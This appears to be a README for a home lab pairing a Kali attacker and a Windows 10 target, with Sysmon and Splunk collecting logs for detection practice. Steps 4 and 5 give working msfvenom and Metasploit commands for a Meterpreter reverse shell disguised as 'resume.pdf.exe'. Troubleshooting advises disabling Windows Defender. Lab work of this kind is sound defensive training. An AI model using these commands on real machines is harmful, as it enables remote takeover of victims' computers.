## 📌 Introduction

This project demonstrates the setup of a home lab environment for cybersecurity testing, including:

- **Attacker Machine** → Kali Linux
- **Target Machine** → Windows 10 VM
- **Logging System** → Splunk for monitoring malicious activities

Key activities include:
- Setting up virtual machines
- Installing and configuring Sysmon for log collection
- Deploying malware using `msfvenom`
- Monitoring attacks using Splunk

📌 *The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.*

---

## Step 1: Setting Up Virtual Machines

### 🖥️ 1.1 Install Kali Linux (Attacker Machine)

1. Download **Kali Linux ISO** from [Kali Official Website](https://www.kali.org/downloads/).
2. Create a new VM in VMware/VirtualBox and install Kali Linux.
3. Update and upgrade Kali:
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

### 🖥️ 1.2 Install Windows 10 (Target Machine)

1. Download Windows 10 ISO from [Microsoft's website](https://www.microsoft.com/en-us/software-download/windows10ISO).
2. Create a new VM and install Windows 10.
3. Ensure **networking is enabled** for communication between VMs.

---

## Step 2: Installing Splunk for Log Monitoring

1. Download **Splunk Free** from [Splunk Website](https://www.splunk.com/).
2. Install Splunk on your Windows 10 VM.
3. Start Splunk and log in with admin credentials.
4. Enable **data collection** for monitoring logs.

---

## Step 3: Installing Sysmon on Windows 10

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Download a pre-configured `sysmonconfig.xml` from [Sysmon Modular](https://github.com/olafhartong/sysmon-modular).
3. Open **PowerShell as Administrator** and run:
   ```powershell
   cd "C:\Users\Downloads\sysmon"
   .\sysmon64.exe -i sysmonconfig.xml
   ```
4. Verify Sysmon is running:
   ```powershell
   Get-Process sysmon64
   ```

---

## Step 4: Generating Malware with msfvenom

On Kali Linux, generate a malicious executable:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
```
📌 *This creates `resume.pdf.exe`, which acts as our payload.*

---

## Step 5: Setting Up a Metasploit Listener

1. Open Metasploit on Kali:
   ```bash
   msfconsole
   ```
2. Configure the listener:
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST <Attacker_IP>
   set LPORT 4444
   exploit
   ```
3. Deploy `resume.pdf.exe` on Windows 10 and execute it.
4. If successful, you gain a Meterpreter session:
   ```bash
   meterpreter > sysinfo
   ```

---

## Step 6: Monitoring Logs with Splunk

1. Open Splunk and search for unauthorized activity:
   ```
   index=main sourcetype=WinEventLog:Security
   ```
2. Identify anomalies related to unauthorized access.
3. Create alerts to detect suspicious behavior.

---

## 🔍 Troubleshooting

### ❌ Metasploit Handler Not Receiving a Session
- Ensure Windows Defender is **disabled** to prevent blocking the payload.
- Double-check **LHOST and LPORT settings** in both `msfvenom` and `msfconsole`.
- Run the payload on Windows as **Administrator**.

### ❌ Splunk Not Logging Events
- Verify Sysmon is correctly installed and running.
- Ensure Windows Event Logging is enabled in Splunk.
- Restart Splunk and recheck the event index.

---

## 🎯 Next Steps & Future Improvements

✔️ Integrate **ELK Stack** for enhanced log analysis.
✔️ Automate attack execution using **Python scripts**.
✔️ Implement **Wazuh SIEM** for better threat detection.
